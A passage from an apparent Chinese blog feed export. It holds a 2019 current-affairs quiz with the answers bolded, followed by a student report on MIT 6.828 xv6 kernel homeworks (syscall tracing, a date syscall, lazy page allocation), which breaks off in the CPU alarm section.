<p>改革开放以来，工业化、城镇化快速发展，农业基础巩固加强，工业和服务业发展水平不断提高。2012年，第三产业比重达到()，首次超过第二产业，成为国民经济第一大产业。<br>0.435<br>0.445<br><strong>0.455</strong><br>0.465</p>
<p>在大庆油田发现（ ）周年之际，中共中央总书记、国家主席、中央军委主席习近平发来贺信，代表党中央向大庆油田广大干部职工、离退休老同志及家属表示热烈的祝贺。<br>50<br>55<br><strong>60</strong><br>70</p>
<p>第七届世界军人运动会开幕式10月18日晚在（ ）举行，中共中央总书记、国家主席、中央军委主席习近平出席开幕式并宣布运动会开幕。<br>重庆<br>天津<br><strong>武汉</strong><br>杭州</p>
<p>4月23日，在中国人民解放军海军70华诞之际，我军在（ ）举行庆祝人民海军成立70周年海上阅兵活动。<br>大连<br><strong>青岛</strong><br>天津<br>舟山</p>
<p>挪威诺贝尔委员会2019年10月11日宣布，将2019年诺贝尔和平奖授予埃塞俄比亚总理（   ），以表彰他在谋求和平和国际合作方面所作努力，尤其是在解决与厄立特里亚边境冲突方面的决定性举措<br>阿拉·赛斯莱德·阿里<br>阿拉·赛斯莱德·马拉<br><strong>阿比·艾哈迈德·阿里</strong><br>阿比·艾哈迈德·马拉</p>
<p>2019年10月11日，世界上首名进行太空行走的宇航员（  ）在莫斯科因病去世，享年85岁<br><strong>阿列克谢·列昂诺夫</strong><br>尤里·阿列克谢耶维奇·加加林<br>弗拉迪米尔·科马洛夫<br>兰斯·阿姆斯特朗</p>
<p>以(  )为主题的粤港澳大湾区论坛2019年10月10日在港举办，与会者认为香港应放眼大湾区广阔市场，结合自身优势，不断推动创新，真正抓住发展契机。<br>“促进创新与绿色发展，共创大湾区新机遇”<br>“促进创新与可持续发展，共创大湾区新未来”<br><strong>“促进创新与可持续发展，共创大湾区新机遇”</strong><br>“促进创新与生态共同发展，共创大湾区新机遇”</p>
<p>根据我国宪法的规定，下列哪些选项不属于全国人民代表大会的职权？（ ）<br>批准省、自治区和直辖市的建置<br>决定战争和和平的问题<br><strong>解释法律</strong><br>决定特别行政区的设立及其制度</p>
<p>2019年10月8日，在宽度超过1500米的长江武汉段江面，一座“身披”金秋黄的大型悬索桥一跨过江，犹如金色巨龙卧伏江面。这座（  ）通车，标志着长江上首座双层公路大桥正式投入使用。<br>武汉关岭长江大桥<br>武汉丹昆特长江大桥<br>武汉矮寨特长江大桥<br><strong>武汉杨泗港长江大桥</strong></p>
<p>2019年10月4日，家电企业格兰仕近日正式发布名为（  ）的家电物联网芯片。该款芯片采用40纳米制程，比同等制程的国外芯片速度更快、能效更高，更体现家电行业特点。<br>“Atom凌动”<br><strong>“BF—细滘”</strong><br>“澎湃-I7”<br>“腾龙35”</p>
<p>2019年9月26日，中央广播电视总台首个区域总部和地方总站——（  ）正式启用。<br><strong>长三角总部暨上海总站</strong><br>珠三角总部暨广东总站<br>环渤海总部暨天津总站<br>云贵川总部暨四川总站</p>
<p>中国国务院新闻办公室将于9月27日10时发布（ ）白皮书。<br><strong>《新时代的中国与世界》</strong><br>《中国交通运输发展》<br>《中国互联网状况》<br>《中国云计算产业发展》</p>
<p>北京2022年冬奥会和冬残奥会吉祥物发布仪式2019年9月17日晚在北京首钢园区国家冬季运动训练中心冰球馆隆重举行，发布了北京冬奥会吉祥物“（  ）”。<br>熊猫盼盼<br><strong>冰墩墩</strong><br>雪容融<br>海宝</p>
<p>2019年9月20日，国新办举行新中国成立70周年工业通信业发展情况发布会。70年来，我国成为全世界唯一拥有联合国产业分类中所列全部工业门类的国家，工业增加值从1952年的120亿元增加到2018年的30多万亿元。工业通信业技术创新能力大幅提升，5G标准必要专利数量全球（  ）。<br><strong>第一</strong><br>第二<br>第三<br>第四</p>
<p>国家统计局2019年9月29日，发布的报告《国际地位显著提高国际影响力持续增强》显示，2018年中国对世界经济增长的贡献率为27.5%，比1978年提高了24.4个百分点。中国已经连续（  ）成为世界经济增长的第一引擎，对推动世界经济发展的贡献不容小视。<br>11年<br>12年<br><strong>13年</strong><br>14年</p>
<h1 id="多选"><a href="#多选" class="headerlink" title="多选"></a>多选</h1><p>为庆祝中华人民共和国成立70周年、人民政协成立70周年，全国政协近日推出（ ）、（ ）两个主题展览。<br><strong>《档案实录——人民政协成立前后珍贵资料展》</strong><br>《70年人民政协成就展》<br><strong>《人民政协光辉历程》</strong><br>《人民政协历史与人物展》</p>
<p>习近平总书记在“两不愁三保障”突出问题座谈会上指出，到2020年稳定实现农村贫困人口不愁吃、不愁穿，（ ）有保障，是贫困人口脱贫的基本要求和核心指标，直接关系攻坚战质量。<br><strong>义务教育</strong><br>充分就业<br><strong>基本医疗</strong><br><strong>住房安全</strong></p>
<p>习近平总书记强调，做好全年经济工作，要紧紧围绕贯彻落实中央经济工作会议精神，坚持（ ）的总体思路，统筹国内国际两个大局，做好稳增长、促改革、调结构、惠民生、防风险、保稳定各项工作。<br><strong>宏观政策要稳</strong><br><strong>微观政策要活</strong><br><strong>社会政策要托底</strong><br>财政政策要积极<br>货币政策要审慎</p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，新时代中国青年运动的主题是（ ），为（ ）而奋斗。<br><strong>坚持中国共产党领导</strong><br><strong>同人民一道</strong><br><strong>实现“两个一百年”奋斗目标</strong><br><strong>实现中华民族伟大复兴的中国梦</strong><br>实现人民对美好生活的向往</p>
<p>习近平在“不忘初心、牢记使命”主题教育工作会议上的讲话中指出，主题教育要牢牢把握（ ）的总要求。<br><strong>守初心</strong><br><strong>担使命</strong><br><strong>找差距</strong><br>补短板<br><strong>抓落实</strong></p>
<p>9月12日，习近平在视察中共中央北京香山革命纪念地时指出，我们缅怀这段历史，就是要继承和发扬老一辈革命家（ ）的优良作风，始终保持奋发有为的进取精神。<br><strong>谦虚谨慎</strong><br><strong>不骄不躁</strong><br><strong>艰苦奋斗</strong><br>忠贞不渝</p>
<p>新民主主义革命的意义包括：<br><strong>彻底结束了旧中国半殖民地半封建社会的历史</strong><br><strong>彻底结束了旧中国一盘散沙的局面</strong><br><strong>彻底废除了西方列强强加给中国的不平等条约和帝国主义在中国的一切特权</strong><br>实现了人民当家作主</p>
<p>以下属于改革开放新的伟大革命的意义的是：<br><strong>开辟了中国特色社会主义道路</strong><br><strong>形成了中国特色社会主义理论体系</strong><br><strong>确立了中国特色社会主义制度</strong><br><strong>发展了中国特色社会主义文化</strong></p>
<p>十九届三中全会提出，转变政府职能，优化政府机构设置和职能配置，是深化党和国家机构改革的重要任务。对于转变政府职能，优化政府机构设置和职能配置的措施表述正确的有（）。<br><strong>要坚决破除制约使市场在资源配置中起决定性作用、更好发挥政府作用的体制机制弊端</strong><br><strong>围绕推动高质量发展，建设现代化经济体系</strong><br><strong>调整优化政府机构职能，合理配置宏观管理部门职能，深入推进简政放权，完善市场监管和执法体制</strong><br><strong>改革自然资源和生态环境管理体制，完善公共服务管理体制，强化事中事后监管，提高行政效率，全面提高政府效能，建设人民满意的服务型政府</strong></p>
<p>10月13日，习近平致信祝贺中国少年先锋队建队70周年强调新时代少先队员要（ ），努力成长为能够担当民族复兴大任的时代新人！<br><strong>从小学先锋</strong><br><strong>长大做先锋</strong><br>心中有阳光<br>脚下有力量</p>
<p>2019年10月9日，在第二十一届中国国际矿业大会上，自然资源部中国地质调查局向社会展示了“航空地质一号”固定翼飞机模型。该飞机是目前全球首架且唯一一架集（ ）、（ ）、（ ）、（ ）等于一体的大集成航空物探遥感综合测量平台，在航空物探、航空遥感调查等方面性能达到国际领先水平。<br><strong>重力</strong><br><strong>磁场</strong><br>激光<br><strong>航空摄影</strong><br><strong>高光谱遥感</strong></p>
<p>2019年9月24日，庆祝新中国成立70周年活动新闻中心举行首场新闻发布会。会上，国家发展改革委副主任、国家统计局局长宁吉喆介绍说，70年来，我国综合国力大幅提升。1952年至2018年，我国GDP实际增长174倍；人均GDP从119元提高到6.46万元，实际增长70倍。目前，我国已成为（）、（）、外汇储备第一大国、（）、使用外资第二大国、对外投资第二大国。<br><strong>世界第二大经济体</strong><br><strong>货物贸易第一大国</strong><br>科技成果产出第二大国<br><strong>服务贸易第二大国</strong></p>
<p>2019年7月12日，中国将于2020年首次探测火星，通过火星卫星、火星着陆器、火星车天地联合探测火星，目前火星车已经做好。中国首次探测便要实现( )、（ ）、（ ）三大任务，这在世界航天史上确实是绝无仅有的。 <br>“测”<br><strong>“绕”</strong><br><strong>“落”</strong><br><strong>“巡”</strong></p>
<p>根据国务院关税税则委员会2019年第3号公告，中国已于2019年6月1日起，对原产于美国的部分进口商品提高加征关税税率。根据公告，国务院关税税则委员会对原产于美国约600亿美元进口商品清单中的部分商品，分别实施加征（ ）、（ ）、（ ）的关税。对之前加征5%关税的税目商品，仍实施加征5%的关税。<br>35%<br><strong>25%</strong><br><strong>20%</strong><br><strong>10%</strong></p>
<p>中共中央总书记、国家主席、中央军委主席习近平于2019年6月对垃圾分类工作作出重要指示。习近平强调，实行垃圾分类，关系广大人民群众生活环境，关系节约使用资源，也是社会文明水平的一个重要体现。习近平指出，推行垃圾分类，关键是要（ ）、（ ）、（ ）。<br><strong>加强科学管理</strong><br>加强监督巡查<br><strong>形成长效机制</strong><br><strong>推动习惯养成</strong></p>
<p>工信部2019年6月6日正式向（ ）、（ ）、（ ）、（ ）发放5G商用牌照，5G时代已经到来。<br><strong>中国电信</strong><br><strong>中国移动</strong><br><strong>中国联通</strong><br>中国铁通<br><strong>中国广电</strong></p>
<p>国家主席习近平9月23日在人民大会堂会见伊拉克总理阿卜杜勒-迈赫迪。习近平强调，中国是参与伊拉克经济（）、（）、（）、（）的国家。<br><strong>重建最早</strong><br>建交最早<br><strong>时间最长</strong><br><strong>项目分布最广</strong><br><strong>领域最多</strong></p>
<p>习近平总书记在“两不愁三保障”突出问题座谈会上指出脱贫攻坚要做到（ ）。<br><strong>摘帽不摘责任</strong><br><strong>摘帽不摘政策</strong><br><strong>摘帽不摘帮扶</strong><br><strong>摘帽不摘监管</strong></p>
<p>习近平总书记在“两不愁三保障”突出问题座谈会上指出，要着力抓好（ ），不断增强人民群众获得感、幸福感、安全感。<br><strong>安全生产</strong><br><strong>食品药品安全</strong><br><strong>防范重特大自然灾害</strong><br><strong>维护社会稳定工作</strong></p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，五四运动是一场中国人民为（ ）而掀起的伟大社会革命运动。<br><strong>拯救民族危亡</strong><br><strong>捍卫民族尊严</strong><br><strong>凝聚民族力量</strong><br>推动民族振兴</p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，五四运动是一场传播新思想新文化新知识的伟大（ ）。<br><strong>思想启蒙运动</strong><br><strong>新文化运动</strong><br>爱国革命运动<br>社会革命运动</p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，五四运动，以（ ）推动了中国社会进步，促进了马克思主义在中国的传播，促进了马克思主义同中国工人运动的结合，<br>爱国救亡的时代性<br><strong>彻底反帝反封建的革命性</strong><br><strong>追求救国强国真理的进步性</strong><br><strong>各族各界群众积极参与的广泛性</strong></p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，五四运动，孕育了以（ ）为主要内容的伟大五四精神。<br><strong>爱国</strong><br><strong>进步</strong><br><strong>民主</strong><br><strong>科学</strong><br>法治</p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，新时代中国青年要树立远大理想，要树立（ ）。<br><strong>对马克思主义的信仰</strong><br><strong>对中国特色社会主义的信念</strong><br><strong>对中华民族伟大复兴中国梦的信心</strong><br>对中国共产党治国理政的信任</p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，新时代中国青年要热爱伟大祖国，坚持爱国和（ ）高度统一。<br><strong>爱党</strong><br>爱团<br><strong>爱社会主义</strong><br>爱人民</p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，新时代中国青年要担当时代责任，努力成为（ ）全面发展的社会主义建设者和接班人。<br><strong>德</strong><br><strong>智</strong><br><strong>体</strong><br><strong>美</strong><br><strong>劳</strong></p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，新时代中国青年要勇于砥砺奋斗，勇做走在时代前列的（ ）。<br><strong>奋进者</strong><br><strong>开拓者</strong><br>建设者<br><strong>奉献者</strong></p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，新时代中国青年要练就过硬本领，使自己的（ ）跟上越来越快的时代发展。<br><strong>思维视野</strong><br><strong>思想观念</strong><br><strong>认识水平</strong><br>创新精神</p>
<p>习近平总书记在纪念五四运动100周年大会上的讲话中指出，新时代中国青年要锤炼品德修为，自觉抵制（ ）等错误思想。<br><strong>拜金主义</strong><br><strong>享乐主义</strong><br><strong>极端个人主义</strong><br><strong>历史虚无主义</strong></p>
<p>习近平在亚洲文明对话大会开幕式上的主旨演讲中指出，当前，（ ）深入发展，人类社会充满希望。<br>世界多极化<br><strong>经济全球化</strong><br><strong>文化多样化</strong><br><strong>社会信息化</strong></p>
]]></content>
      <tags>
        <tag>Others</tag>
      </tags>
  </entry>
  <entry>
    <title>关于「xv6」的五个小实验</title>
    <url>/Xv6-homeworks/</url>
    <content><![CDATA[<p>Reports of MIT 6.828 xv6 homeworks</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<h1 id="xv6-system-calls"><a href="#xv6-system-calls" class="headerlink" title="xv6 system calls"></a>xv6 system calls</h1><h2 id="Part-One-System-call-tracing"><a href="#Part-One-System-call-tracing" class="headerlink" title="Part One: System call tracing"></a>Part One: System call tracing</h2><p>修改xv6内核，在实现系统调用时打印系统调用的名称和返回值。</p>
<p>只需在<code>syscall.c</code>中系统调用时增加一行输出即可。</p>
<p>为了输出系统调用名称，增加对应的数组：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *syscalls_name[] = &#123;</span><br><span class="line">[SYS_fork]    <span class="string">&quot;fork&quot;</span>,</span><br><span class="line">[SYS_exit]    <span class="string">&quot;exit&quot;</span>,</span><br><span class="line">[SYS_wait]    <span class="string">&quot;wait&quot;</span>,</span><br><span class="line">[SYS_pipe]    <span class="string">&quot;pipe&quot;</span>,</span><br><span class="line">[SYS_read]    <span class="string">&quot;read&quot;</span>,</span><br><span class="line">[SYS_kill]    <span class="string">&quot;kill&quot;</span>,</span><br><span class="line">[SYS_exec]    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">[SYS_fstat]   <span class="string">&quot;fstat&quot;</span>,</span><br><span class="line">[SYS_chdir]   <span class="string">&quot;chdir&quot;</span>,</span><br><span class="line">[SYS_dup]     <span class="string">&quot;dup&quot;</span>,</span><br><span class="line">[SYS_getpid]  <span class="string">&quot;getpid&quot;</span>,</span><br><span class="line">[SYS_sbrk]    <span class="string">&quot;sbrk&quot;</span>,</span><br><span class="line">[SYS_sleep]   <span class="string">&quot;sleep&quot;</span>,</span><br><span class="line">[SYS_uptime]  <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">[SYS_open]    <span class="string">&quot;open&quot;</span>,</span><br><span class="line">[SYS_write]   <span class="string">&quot;write&quot;</span>,</span><br><span class="line">[SYS_mknod]   <span class="string">&quot;mknod&quot;</span>,</span><br><span class="line">[SYS_unlink]  <span class="string">&quot;unlink&quot;</span>,</span><br><span class="line">[SYS_link]    <span class="string">&quot;link&quot;</span>,</span><br><span class="line">[SYS_mkdir]   <span class="string">&quot;mkdir&quot;</span>,</span><br><span class="line">[SYS_close]   <span class="string">&quot;close&quot;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>利用定义的数组，在<code>syscall</code>函数中增加输出（11行）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">syscall(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">curproc</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = curproc-&gt;tf-&gt;eax;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    curproc-&gt;tf-&gt;eax = syscalls[num]();</span><br><span class="line">    cprintf(<span class="string">&quot;%s -&gt; %d\n&quot;</span>, syscalls_name[num], curproc-&gt;tf-&gt;eax);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cprintf(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            curproc-&gt;pid, curproc-&gt;name, num);</span><br><span class="line">    curproc-&gt;tf-&gt;eax = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新运行<code>make qemu</code>，得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make qemu</span></span><br><span class="line">qemu-system-i386 -serial mon:stdio -drive file=fs.img,index=1,media=disk,format=raw -drive file=xv6.img,index=0,media=disk,format=raw -smp 2 -m 512 </span><br><span class="line">xv6...</span><br><span class="line">cpu1: starting 1</span><br><span class="line">cpu0: starting 0</span><br><span class="line">sb: size 1000 nblocks 941 ninodes 200 nlog 30 logstart 2 inodestart 32 bmap start 58</span><br><span class="line">exec -&gt; 0</span><br><span class="line">open -&gt; 0</span><br><span class="line">dup -&gt; 1</span><br><span class="line">dup -&gt; 2</span><br><span class="line">iwrite -&gt; 1</span><br><span class="line">nwrite -&gt; 1</span><br><span class="line">iwrite -&gt; 1</span><br><span class="line">twrite -&gt; 1</span><br><span class="line">:write -&gt; 1</span><br><span class="line"> write -&gt; 1</span><br><span class="line">swrite -&gt; 1</span><br><span class="line">twrite -&gt; 1</span><br><span class="line">awrite -&gt; 1</span><br><span class="line">rwrite -&gt; 1</span><br><span class="line">twrite -&gt; 1</span><br><span class="line">iwrite -&gt; 1</span><br><span class="line">nwrite -&gt; 1</span><br><span class="line">gwrite -&gt; 1</span><br><span class="line"> write -&gt; 1</span><br><span class="line">swrite -&gt; 1</span><br><span class="line">hwrite -&gt; 1</span><br><span class="line"></span><br><span class="line">write -&gt; 1</span><br><span class="line">fork -&gt; 2</span><br><span class="line">exec -&gt; 0</span><br><span class="line">open -&gt; 3</span><br><span class="line">close -&gt; 0</span><br><span class="line"><span class="meta">$</span><span class="bash">write -&gt; 1</span></span><br><span class="line"> write -&gt; 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Part-Two-Date-system-call"><a href="#Part-Two-Date-system-call" class="headerlink" title="Part Two: Date system call"></a>Part Two: Date system call</h2><p>增加一个新的系统调用，输出当前UTC（Coordinated Universal Time，协调世界时）时间。</p>
<p>根据提示，通过分析已经实现的系统调用（如<code>uptime</code>）来创建新的系统调用<code>date</code>。</p>
<p><code>grep -n uptime *.[chS]</code>查看所有含<code>uptime</code>的<code>.c</code>、<code>.h</code>和<code>.S</code>文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">syscall.c:105:extern int sys_uptime(void);</span><br><span class="line">syscall.c:124:[SYS_uptime]  sys_uptime,</span><br><span class="line">syscall.c:149:[SYS_uptime]  &quot;uptime&quot;,</span><br><span class="line">syscall.h:15:#define SYS_uptime 14</span><br><span class="line">sysproc.c:83:sys_uptime(void)</span><br><span class="line">user.h:25:int uptime(void);</span><br><span class="line">usys.S:31:SYSCALL(uptime)</span><br></pre></td></tr></table></figure>
<p>依次在上述文件的对应位置添加系统调用<code>date</code>。</p>
<p><code>syscall.h</code>（添加系统调用编号）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_date 22</span></span><br></pre></td></tr></table></figure>
<p><code>syscall.c</code>（添加系统调用函数的外部声明）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[SYS_date]  <span class="string">&quot;date&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">···</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_date</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">···</span><br><span class="line">[SYS_date] sys_date</span><br></pre></td></tr></table></figure>
<p><code>user.h</code>（添加用户态函数的定义）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">date</span><span class="params">(struct rtcdate*)</span></span>;</span><br></pre></td></tr></table></figure>
<p><code>usys.S</code>（添加用户态函数的实现）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL(date)</span><br></pre></td></tr></table></figure>
<p><code>sysproc.c</code>（添加系统调用函数的实现）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">sys_date(struct rtcdate *r)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argptr(<span class="number">0</span>, (<span class="keyword">void</span> *)&amp;r, <span class="keyword">sizeof</span>(*r)) &lt; <span class="number">0</span>)</span><br><span class="line">       <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  	cmostime(r);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>根据提示，新建文件 <code>date.c</code> ，添加使用此系统调用函数的方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;date.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span> <span class="title">r</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (date(&amp;r))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">&quot;date failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// your code to print the time in any format you like...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">1</span>, <span class="string">&quot;%d/%d/%d %d:%d:%d\n&quot;</span>, r.month, r.day, r.year, r.hour, r.minute, r.second);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>MakeFile</code>中添加<code>UPROGS</code>对应的命令：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">_date\</span><br></pre></td></tr></table></figure>
<p>注释掉<code>Part One</code>的更改，重新运行<code>make qemu</code>，得到输出如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ date</span><br><span class="line"><span class="number">12</span>/<span class="number">28</span> <span class="number">2020</span> <span class="number">7</span>:<span class="number">15</span>:<span class="number">27</span> </span><br></pre></td></tr></table></figure>
<h1 id="xv6-lazy-page-allocation"><a href="#xv6-lazy-page-allocation" class="headerlink" title="xv6 lazy page allocation"></a>xv6 lazy page allocation</h1><h2 id="Part-One-Eliminate-allocation-from-sbrk"><a href="#Part-One-Eliminate-allocation-from-sbrk" class="headerlink" title="Part One: Eliminate allocation from sbrk()"></a>Part One: Eliminate allocation from sbrk()</h2><p>实现页面延迟分配的第一步，消除系统调用<code>sbrk</code>中的分配。</p>
<p>修改系统调用<code>sbrk</code>的实际实现<code>sys_sbrk</code>，使它只将进程的内存空间大小增加<code>n</code>，而不进行实际的分配。</p>
<p>在<code>sysproc.c</code>的<code>sys_sbrk</code>函数中，根据提示，增加进程大小<code>n</code>，并返回旧的大小。不分配内存，注释掉<code>growproc</code>函数的调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">sys_sbrk(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> addr;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  addr = myproc()-&gt;sz;</span><br><span class="line">  myproc()-&gt;sz += n;</span><br><span class="line">  <span class="comment">// if(growproc(n) &lt; 0)</span></span><br><span class="line">  <span class="comment">//   return -1;</span></span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新运行<code>make qemu</code>并键入<code>echo hi</code>，得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> hi</span></span><br><span class="line">pid 3 sh: trap 14 err 6 on cpu 0 eip 0x12e9 addr 0x4004--kill proc</span><br></pre></td></tr></table></figure>
<h2 id="Part-Two-Lazy-allocation"><a href="#Part-Two-Lazy-allocation" class="headerlink" title="Part Two: Lazy allocation"></a>Part Two: Lazy allocation</h2><p>实现页面延迟分配的第二步，响应第一步造成的错误，使进程继续执行。</p>
<p>根据提示，修改<code>trap.c</code>中的代码，以通过在故障地址处映射新分配的物理内存页来响应用户空间中的页面错误，然后返回到用户空间以使进程继续执行。</p>
<p>根据提示，在<code>trap.c</code>的<code>trap</code>函数<code>switch</code>语句中增加<code>case</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> T_PGFLT: &#123;</span><br><span class="line">  <span class="keyword">char</span> *mem;</span><br><span class="line">  mem = kalloc();</span><br><span class="line">  <span class="keyword">if</span>(mem != <span class="number">0</span>)&#123;</span><br><span class="line">	uint va = PGROUNDDOWN(rcr2());</span><br><span class="line">	<span class="built_in">memset</span>(mem, <span class="number">0</span>, PGSIZE);</span><br><span class="line">	<span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">mappages</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">void</span> *va, uint size, uint pa, <span class="keyword">int</span> perm)</span></span>;</span><br><span class="line">	<span class="keyword">if</span>(mappages(myproc()-&gt;pgdir,(<span class="keyword">void</span> *)va, PGSIZE, V2P(mem), PTE_W|PTE_U) &gt;= <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若在<code>case T_PGFLT:</code>后未加<code>&#123;&#125;</code>，运行<code>make qemu</code>则会报以下错误：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make qemu</span></span><br><span class="line">gcc -fno-pic -static -fno-builtin -fno-strict-aliasing -O2 -Wall -MD -ggdb -m32 -Werror -fno-omit-frame-pointer -fno-stack-protector   -c -o trap.o trap.c</span><br><span class="line">trap.c: In function ‘trap’:</span><br><span class="line">trap.c:86: error: a label can only be part of a statement and a declaration is not a statement</span><br><span class="line">&lt;内置&gt;: recipe for target &#x27;trap.o&#x27; failed</span><br><span class="line">make: *** [trap.o] Error 1</span><br></pre></td></tr></table></figure>
<p>根据提示，为了在<code>trap.c</code>中调用<code>mappages</code>函数，需要删除<code>vm.c</code>中<code>mappages</code>函数声明中的<code>static</code>。</p>
<p>重新运行<code>make qemu</code>并键入<code>echo hi</code>，得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> hi</span></span><br><span class="line">hi</span><br></pre></td></tr></table></figure>
<h1 id="xv6-CPU-alarm"><a href="#xv6-CPU-alarm" class="headerlink" title="xv6 CPU alarm"></a>xv6 CPU alarm</h1><p>增加系统调用<code>alarm</code>，当进程使用CPU时间时，它会定期向进程发出警报。</p>
<p>仿照实验<code>xv6 system calls</code>中增加系统调用<code>date</code>的方法增加系统调用<code>alarm</code>，按照提示操作。</p>
<p>增加系统调用<code>alarm</code>：</p>
<p><code>syscall.h</code>（添加系统调用编号）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_alarm 23</span></span><br></pre></td></tr></table></figure>
<p><code>syscall.c</code>（添加系统调用函数的外部声明）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[SYS_alarm]  <span class="string">&quot;alarm&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">···</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_alarm</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">···</span><br><span class="line">[SYS_alarm] sys_alarm</span><br></pre></td></tr></table></figure>
<p><code>user.h</code>（添加用户态函数的定义）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alarm</span><span class="params">(<span class="keyword">int</span> ticks, <span class="keyword">void</span>(*handler)())</span></span>;</span><br></pre></td></tr></table></figure>
<p><code>usys.S</code>（添加用户态函数的实现）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL(alarm)</span><br></pre></td></tr></table></figure>
